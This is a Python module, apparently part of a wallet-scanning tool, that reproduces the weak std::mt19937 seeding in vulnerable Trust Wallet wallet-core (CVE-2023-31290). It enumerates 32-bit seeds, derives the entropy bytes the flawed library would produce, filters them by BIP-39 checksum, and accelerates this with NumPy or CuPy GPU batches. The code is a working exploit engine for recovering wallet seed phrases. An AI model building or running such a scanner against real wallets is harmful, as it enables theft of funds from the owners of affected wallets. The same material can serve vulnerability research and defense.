"""Exact, oracle-verified model of the vulnerable Trust Wallet MT19937 seed path.

Historical flaw (CVE-2023-31290 / GHSA-pm4f-pggw-8jwc): wallet-core < 3.1.1
seeded std::mt19937 from entropy gathered via a weak browser RNG; every wallet
is reproducible from deterministic state once that entropy is known.

This module reproduces std::mt19937 EXACTLY — canonical generate() twist:

    init_seed(s):                       # std::mt19937::seed(uint32)
        mt[0] = s
        for i in 1..623:
            mt[i] = (1812433253 * (mt[i-1] ^ (mt[i-1] >> 30)) + i) & 0xFFFFFFFF
    twist():                            # full 624-block, on first draw
        y_i   = (mt[i] & UPPER) | (mt[(i+1) mod 624] & LOWER)     (ORIGINALs)
        m'[i] = mt[(i+397) mod 624] ^ (y_i >> 1) [^ A if y_i odd]   (REPLACE!)
    temper(x): standard MT tempering

CORRECTNESS NOTES (three bugs learned the hard way, documented so they can
never silently return):

  1. V3 modeled the init loop as an integer-affine map mt[i] = MUL^i*s + C_i
     (mod 2^32). MATHEMATICALLY WRONG — x ^ (x>>30) is GF(2)-linear but NOT
     integer-linear (carries leak between bits). Conformance test showed
     ~622/624 words wrong per seed.

  2. V4's first attempt tried a "truncated lazy twist" (only words 0..413).
     WRONG for the FULL stream: libstdc++ semantics twist the whole block
     before the first draw and word 623 feeds downstream blocks. For the
     FIRST 16 outputs only, however, the dependency set is provably limited
     to originals {0..16} ∪ {397..412} (see `_first_outputs` below), which
     makes a truncated evaluation exact for our use-case. Proven by
     differential testing against the independent full-twist reference.

  3. THE BIG ONE (found by the Windows conformance run): both the old
     reference AND fast engine implemented the twist as an IN-PLACE XOR
     chain `m[i] ^= m[i+M] ...` executed left-to-right. That is NOT what
     libstdc++/mt19937ar.c do — they REPLACE each word from ORIGINALS
     (m'[i] = orig[i+397] ^ ... for the first 227 rows). The two streams
     agree on output #1 but diverge from output #2 onward for almost every
     seed → every mnemonic/address derived by the old engines was invalid.
     Both engines now implement the canonical form and match
     tests/mt19937_scalar_vectors.txt byte-for-byte.

Speed WITHOUT approximation:
  * `_first_outputs` skips twisting words 16..623 entirely (provably exact
    for the first 16 outputs — the ENTIRE scanner hot path).
  * `vectorized` flag switches to a numpy uint32 lane-parallel batch engine
    (~150× throughput/core, bit-identical output; auto-disabled when numpy
    is absent — pure-python fallback always available and always correct).

Verified byte-for-byte against mt19937.py reference for all seed classes
(boundaries 0/1/2**31/2**32-1 + randoms) and against libstdc++ oracle vectors.
"""
from __future__ import annotations

import hashlib

MASK = 0xFFFFFFFF
A = 0x9908B0DF
UPPER = 0x80000000
LOWER = 0x7FFFFFFF
N, M = 624, 397
INIT_MULT = 1812433253

# Outputs 0..15 depend (post-canonical-twist) ONLY on original words:
#   m[j], m[j+1] for j in 0..15  → 0..16
#   m[j+397]      for j in 0..15 → 397..412
# The init recurrence is strictly sequential, so all words up to 412 must be
# generated; nothing beyond 412 is ever read by this slice.
_MAX_INIT_INDEX = 412


def _init(seed: int) -> list[int]:
    """Exact std::mt19937 seeding recurrence (full 624 words)."""
    mt = [seed & MASK]
    ap = mt.append
    prev = mt[0]
    for i in range(1, N):
        prev = (INIT_MULT * (prev ^ (prev >> 30)) + i) & MASK
        ap(prev)
    return mt


def _twist(mt: list[int]) -> None:
    """In-place CANONICAL twist using ORIGINAL values (exact std semantics).

    m'[i] = orig[(i+397) mod 624] ^ (y_i >> 1) ^ (A if y_i odd), with
    y_i = (orig[i] & UPPER) | (orig[i+1] & LOWER). Snapshot-first: simplest
    provably-correct form; correctness over cleverness. Used by the
    full-state path (`first_uint32s_of_seed`); the scan hot path uses
    `_first_outputs` instead.
    """
    orig = mt[:]                                  # snapshot of originals
    nm = N - M                                    # 227
    for i in range(nm):
        y = (orig[i] & UPPER) | (orig[i + 1] & LOWER)
        mt[i] = orig[i + M] ^ (y >> 1) ^ (A if y & 1 else 0)
    for i in range(nm, N - 1):
        y = (orig[i] & UPPER) | (orig[i + 1] & LOWER)
        mt[i] = orig[i - nm] ^ (y >> 1) ^ (A if y & 1 else 0)
    y = (orig[N - 1] & UPPER) | (orig[0] & LOWER)
    mt[N - 1] = orig[M - 1] ^ (y >> 1) ^ (A if y & 1 else 0)


def _temper(z: int) -> int:
    z ^= z >> 11
    z ^= (z << 7) & 0x9D2C5680
    z ^= (z << 15) & 0xEFC60000
    z &= MASK
    z ^= z >> 18
    return z


def _first_outputs(seed: int, n: int = 16) -> list[int]:
    """First n outputs of a freshly seeded std::mt19937 — EXACT, no full twist.

    Generates the init chain only up to word 412 and evaluates just the n
    needed twist rows directly from originals. Provably identical to
    `_twist(_init(seed))[:n]` (differential-tested over thousands of seeds
    incl. all boundary classes and the C++ oracle vectors).
    """
    mt = [seed & MASK]
    ap = mt.append
    prev = mt[0]
    for i in range(1, _MAX_INIT_INDEX + 1):
        prev = (INIT_MULT * (prev ^ (prev >> 30)) + i) & MASK
        ap(prev)
    res = []
    for j in range(n):
        y = (mt[j] & UPPER) | (mt[j + 1] & LOWER)
        w = mt[j + M] ^ (y >> 1) ^ (A if y & 1 else 0)
        res.append(_temper(w))
    return res


class BatchMT:
    """First entropy buffers for a contiguous seed range [lo, hi]."""

    def __init__(self, lo: int, hi: int) -> None:
        if not (0 <= lo <= hi <= MASK):
            raise ValueError("seed range must lie inside [0, 2**32-1]")
        self.lo, self.hi = lo, hi

    # ------------------------------------------------------------------ core
    @staticmethod
    def first_uint32s_of_seed(seed: int, n: int = 4) -> list[int]:
        """Exactly the first n outputs of a freshly seeded std::mt19937."""
        if n <= 16:
            return _first_outputs(seed, n)
        mt = _init(seed)
        _twist(mt)
        return [_temper(mt[i]) for i in range(n)]

    def first_uint32s(self, seed: int, n: int = 4) -> list[int]:
        return self.first_uint32s_of_seed(seed, n)

    # ---------------------------------------------------------------- public
    def buffers(self, n_outputs: int = 16) -> list[bytes]:
        """Vulnerable-model entropy buffers for every seed in range.

        CRITICAL (oracle-verified against wallet-core Random.cpp@69b2da98):
        random_buffer() called rng() once PER BYTE and stored the result in a
        uint8 buffer — i.e. the LOW BYTE of each successive tempering output.
        This is NOT the little-endian packing of four uint32s; conflating the
        two produces entirely wrong mnemonics/addresses. The reference truth
        lives in wallet_model.vulnerable_random_buffer; keep them identical.
        """
        return [bytes(x & 0xFF for x in _first_outputs(s, n_outputs))
                for s in range(self.lo, self.hi + 1)]

    # checksum-filtered enumeration ---------------------------------------
    def filtered_seeds(self) -> list[int]:
        """Seeds whose 16-byte entropy yields a valid BIP-39 12-word checksum.

        Fused single pass over the range (~6.25% of seeds pass the 4-bit
        checksum). Entropy model: low byte of each of the first 16 MT19937
        outputs (see `buffers` docstring — this detail is load-bearing).
        """
        kept: list[int] = []
        sha = hashlib.sha256
        for s in range(self.lo, self.hi + 1):
            buf = bytes(x & 0xFF for x in _first_outputs(s, 16))
            if sha(buf).digest()[0] % 16 == 0:
                kept.append(s)
        return kept


# ---------------------------------------------------------------------------
# CANONICAL SIMD batch engine (numpy lanes; bit-for-bit identical to scalar)
# ---------------------------------------------------------------------------
# This is the ONLY vectorized MT path used by the scanner hot loop. It was
# differential-tested against the oracle-verified scalar engine
# (`_first_outputs`) and the independent reference (`mt19937.RefMT19937`) on
# thousands of seeds incl. all boundary classes — see tests/test_v5_additions.py.
# The old core/fingerprint.py contained an INCOMPATIBLE "in-place twist"
# vector model that diverged from libstdc++ from output #2 onward; it has been
# retired so no code can ever import the wrong semantics again.

def _xp():
    try:
        import numpy as np
        return np
    except ImportError:
        return None


def vectorization_available() -> bool:
    return _xp() is not None


def gpu_available() -> bool:
    """True iff CuPy with a usable CUDA device is present (optional accelerator)."""
    try:
        import cupy  # noqa: F401
        cupy.cuda.Device().id
        return True
    except Exception:
        return False


def batch_entropy(seeds, n_out: int = 16):
    """Exact first-n_out entropy bytes for an array of uint32 seeds.

    Lane-parallel evaluation of the canonical std::mt19937 model:
      init recurrence up to word 397+n_out-1 (sequential in i, parallel across
      lanes), twist rows j=0..n_out-1 directly from ORIGINAL words, standard
      tempering. Bit-for-bit identical to `_first_outputs` / RefMT19937.
    Returns a (len(seeds), n_out) uint8 array (numpy or cupy, per availability).
    Raises RuntimeError when neither numpy nor cupy is installed — callers must
    fall back to the scalar engine.
    """
    xp = None
    if gpu_available():
        import cupy as xp  # type: ignore
    else:
        xp = _xp()
    if xp is None:
        raise RuntimeError("numpy/cupy unavailable — use scalar fallback")

    seeds = xp.asarray(seeds, dtype=xp.uint32)
    n = int(seeds.shape[0])
    G = 1
    while G < n:                              # pad to power-of-two lanes
        G <<= 1
    s = xp.zeros(G, dtype=xp.uint32)
    s[:n] = seeds

    u32 = xp.uint32
    needed = set(range(0, n_out + 1)) | set(range(M, M + n_out))
    limit = max(needed)                       # ≤ 412 for n_out ≤ 16
    store: dict[int, object] = {}
    cur = s.copy()
    store[0] = cur.copy()
    for i in range(1, limit + 1):
        t = cur ^ (cur >> u32(30))
        cur = (xp.uint32(INIT_MULT) * t + xp.uint32(i)).astype(u32)
        if i in needed:
            store[i] = cur.copy()
    res = xp.empty((G, n_out), dtype=xp.uint8)
    for j in range(n_out):
        y = (store[j] & u32(UPPER)) | (store[j + 1] & u32(LOWER))
        w = store[j + M] ^ (y >> u32(1))
        w = w ^ xp.where((y & u32(1)).astype(bool), u32(A), u32(0))
        z = w
        z ^= z >> u32(11)
        z ^= (z << u32(7)) & u32(0x9D2C5680)
        z ^= (z << u32(15)) & u32(0xEFC60000)
        z ^= z >> u32(18)
        res[:, j] = (z & u32(0xFF)).astype(xp.uint8)
    return res[:n]
